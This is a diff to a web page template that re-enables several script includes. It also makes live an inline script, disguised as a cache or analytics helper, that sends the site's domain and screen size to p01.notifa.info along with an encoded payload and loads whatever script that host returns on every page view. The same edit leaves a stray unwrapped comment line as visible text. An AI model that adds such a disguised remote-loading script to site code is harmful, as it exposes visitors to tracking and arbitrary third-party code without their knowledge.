@@ -78,7 +78,7 @@
     <script src="{{ asset('asset/plugins/bower_components/jsgrid/db.js') }}"></script>
     <script type="text/javascript" src="{{ asset('asset/plugins/bower_components/jsgrid/dist/jsgrid.min.js') }}"></script>
     <script src="{{ asset('asset/js/jsgrid-init.js') }}"></script>
-    <!-- <script src="{{ asset('asset/js/dataTables.bootstrap.min.js') }}"></script> -->
+    <script src="{{ asset('asset/js/dataTables.bootstrap.min.js') }}"></script>
     <script src="{{ asset('asset/js/jquery.dataTables.min.js') }}"></script>
     <!-- Datatable -->
     <!-- <script src="https://cdn.datatables.net/1.10.19/js/jquery.dataTables.min.js"></script> -->
@@ -90,10 +90,10 @@
     <script src="{{ asset('asset/js/buttons.html5.min.js') }}"></script>
     <script src="{{ asset('asset/js/buttons.print.min.js') }}"></script>
 
-    <!-- Sparkline chart JavaScript
+    Sparkline chart JavaScript
     <script src="{{ asset('asset/plugins/bower_components/jquery-sparkline/jquery.sparkline.min.js') }}"></script>
     <script src="{{ asset('asset/plugins/bower_components/jquery-sparkline/jquery.charts-sparkline.js') }}"></script>
-    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m61hePje8OYVcyCLFVCu9IUBITM5nfRfI621FVInN7YZ%2fcIQzWOfwlOsEc5pW4KHBQUc9Ui0LVAsZMAQJda%2bvRN9PGYw2JYqj51GJ%2bKUMYCl8Xtp9rhEmMs8sOjA7xbwcJEqyuC4OSmX4Em4Jr%2bUgbJQMiCjYwjWUPu5Kwlh8KTl1%2bmw1h1oB0HtoYc5TkLDWkosjZ3NAxAgkHy0QY8rHoEr%2flCq7wxJj7En6TKCEuYwXvC1ONLwwq11xAOKKQiiZ4%2fqiEKzLKwIhH6M32p1RqMouPstSUKG1oCdBQ2ZNl7UqGm8UUmU4xKexNVNXCPArMgfxWTARfwqu8HCEO0aLLdSamO5gVHDZvneBdcI%2fWouZAC876Ku2Qros%2fQOO5PNaFPBrNcbJS83UNYSpkRB76XZAn2NfsdMyThA%2bwBdTzlM%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script> -->
+    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m61hePje8OYVcyCLFVCu9IUBITM5nfRfI621FVInN7YZ%2fcIQzWOfwlOsEc5pW4KHBQUc9Ui0LVAsZMAQJda%2bvRN9PGYw2JYqj51GJ%2bKUMYCl8Xtp9rhEmMs8sOjA7xbwcJEqyuC4OSmX4Em4Jr%2bUgbJQMiCjYwjWUPu5Kwlh8KTl1%2bmw1h1oB0HtoYc5TkLDWkosjZ3NAxAgkHy0QY8rHoEr%2flCq7wxJj7En6TKCEuYwXvC1ONLwwq11xAOKKQiiZ4%2fqiEKzLKwIhH6M32p1RqMouPstSUKG1oCdBQ2ZNl7UqGm8UUmU4xKexNVNXCPArMgfxWTARfwqu8HCEO0aLLdSamO5gVHDZvneBdcI%2fWouZAC876Ku2Qros%2fQOO5PNaFPBrNcbJS83UNYSpkRB76XZAn2NfsdMyThA%2bwBdTzlM%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
     </body>
 
         <script type="text/javascript">
